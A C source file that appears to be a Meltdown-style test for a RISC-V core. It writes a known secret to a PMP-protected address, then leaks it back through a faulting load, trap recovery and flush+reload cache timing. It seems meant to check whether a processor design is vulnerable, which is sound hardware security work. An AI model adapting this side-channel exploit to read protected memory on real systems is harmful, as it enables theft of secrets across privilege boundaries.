#include <am.h>
#include <klib.h>
#include <stdint.h>
#include <xsextra.h>

#include "../../spectre-v1/src/encoding.h"
#include "../../spectre-v1/src/cache-utils.h"

#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 82
#endif

#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif

#ifndef MELTDOWN_ATTEMPTS
#define MELTDOWN_ATTEMPTS 64
#endif

#define PROBE_ENTRIES 256u
#define PROBE_STRIDE L1_BLOCK_SZ_BYTES
#define SECRET_VALUE 0x53u
#define XS_PMP_FAULT_ADDR ((uintptr_t)0x90000010u)

static uint8_t __attribute__((aligned(4096))) channel[PROBE_ENTRIES * PROBE_STRIDE];
static volatile uintptr_t recover_pc;
static volatile uint64_t trap_count;
static volatile uintptr_t last_trap_cause;
static volatile int trap_armed;

static inline size_t probe_mix(size_t i)
{
  return ((i * 167u) + 13u) % PROBE_ENTRIES;
}

static void top_two_idx(uint64_t *scores, size_t count,
                        uint8_t out_idx[2], uint64_t out_score[2])
{
  out_idx[0] = 0;
  out_idx[1] = 0;
  out_score[0] = 0;
  out_score[1] = 0;

  for (size_t i = 0; i < count; ++i)
  {
    if (scores[i] > out_score[0])
    {
      out_score[1] = out_score[0];
      out_idx[1] = out_idx[0];
      out_score[0] = scores[i];
      out_idx[0] = (uint8_t)i;
    }
    else if (scores[i] > out_score[1])
    {
      out_score[1] = scores[i];
      out_idx[1] = (uint8_t)i;
    }
  }
}

static _Context *meltdown_fault_handler(_Event *ev, _Context *ctx)
{
  (void)ev;
  last_trap_cause = ctx->scause;
  trap_count++;

  if (trap_armed && recover_pc != 0)
    ctx->sepc = recover_pc;

  return ctx;
}

static __attribute__((noinline)) void meltdown_try(uint8_t *fault_addr,
                                                   uint8_t *probe_base)
{
  trap_armed = 1;
  recover_pc = (uintptr_t)&&recover;
  asm volatile(
    "fence rw, rw\n"
    "lb t0, 0(%[fault_addr])\n"
    "slli t0, t0, 6\n"
    "add t0, t0, %[probe_base]\n"
    "ld t1, 0(t0)\n"
    :
    : [fault_addr] "r"(fault_addr),
      [probe_base] "r"(probe_base)
    : "t0", "t1", "memory");
recover:
  trap_armed = 0;
  recover_pc = 0;
  xs_fence();
}

static void flush_probe(void)
{
  for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    xs_flush_cache_line(&channel[i * PROBE_STRIDE]);
  xs_fence();
}

static void read_faulting_byte(uint8_t *fault_addr,
                               uint8_t result[2],
                               uint64_t score[2],
                               uint64_t threshold)
{
  uint64_t hits[PROBE_ENTRIES];

  for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    hits[i] = 0;

  for (int attempt = 0; attempt < MELTDOWN_ATTEMPTS; ++attempt)
  {
    flush_probe();
    meltdown_try(fault_addr, channel);

    for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    {
      const size_t mixed_i = probe_mix(i);
      const uint64_t elapsed = xs_probe_time(&channel[mixed_i * PROBE_STRIDE]);
      if (elapsed <= threshold)
        hits[mixed_i]++;
    }
  }

  top_two_idx(hits, PROBE_ENTRIES, result, score);
}

int main(void)
{
  uint8_t *fault_addr = (uint8_t *)XS_PMP_FAULT_ADDR;

  for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    channel[i * PROBE_STRIDE] = 1;

  *fault_addr = SECRET_VALUE;

  _cte_init(NULL);
  irq_handler_reg(5, meltdown_fault_handler);
  irq_handler_reg(13, meltdown_fault_handler);

  uint64_t measured_threshold = xs_calibrate_threshold(channel, PROBE_STRIDE);
  uint64_t threshold = measured_threshold;
#if USE_FIXED_CACHE_HIT_THRESHOLD
  threshold = CACHE_HIT_THRESHOLD;
#else
  if (threshold == 0)
    threshold = CACHE_HIT_THRESHOLD;
#endif

  printf("[meltdown] mode=xs-pmp-fault-inline\n");
  printf("[meltdown] calibration fallback=%d measured=%lu threshold=%lu fixed=%d attempts=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD, MELTDOWN_ATTEMPTS);
  printf("[meltdown] fault_addr=%p secret=0x%02x\n",
         fault_addr, (unsigned int)SECRET_VALUE);

  uint8_t result[2] = {0, 0};
  uint64_t score[2] = {0, 0};
  read_faulting_byte(fault_addr, result, score, threshold);

  printf("[meltdown] traps=%lu last_cause=%lu\n", trap_count, last_trap_cause);
  printf("[meltdown] byte  0: %c (0x%02x) score=%lu\n",
         (result[0] >= 32 && result[0] < 127) ? result[0] : '?',
         result[0],
         score[0]);
  printf("[meltdown] expected: %c (0x%02x) second=%c (0x%02x) score=%lu\n",
         SECRET_VALUE,
         SECRET_VALUE,
         (result[1] >= 32 && result[1] < 127) ? result[1] : '?',
         result[1],
         score[1]);
  printf("[meltdown] check 0 0x%02x 0x%02x traps=%lu\n",
         result[0],
         SECRET_VALUE,
         trap_count);

  return (trap_count > 0 && result[0] == SECRET_VALUE) ? 0 : 1;
}
